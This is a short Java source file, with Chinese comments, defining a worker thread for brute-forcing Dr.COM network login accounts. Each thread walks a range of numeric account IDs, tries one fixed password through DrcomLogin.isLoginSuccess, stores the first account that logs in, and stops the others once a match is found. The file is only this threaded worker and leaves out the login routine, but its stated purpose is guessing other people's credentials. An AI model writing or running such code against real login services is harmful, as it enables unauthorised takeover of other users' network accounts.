package main;

/**
 * @author vision
 * 线程执行爆破任务
 */
public class DrcomForceTask implements Runnable{

    private int begin;
    private int end;
    private String password;

    /**
     * 所有爆破线程共享账号
     */
    public static volatile String account = null;

    public DrcomForceTask(int begin, int end, String password) {
        this.begin = begin;
        this.end = end;
        this.password = password;
    }

    @Override
    public void run() {
        for (int i = begin; i < end; i++) {
            // 登录成功后，记录账号
            if (DrcomLogin.isLoginSuccess(i + "", password)) {
                account = i + "";
                break;
            }
            // 账号不为空，其余线程发现爆破成功后，终止线程
            if (account != null) {
                break;
            }
        }
    }

}
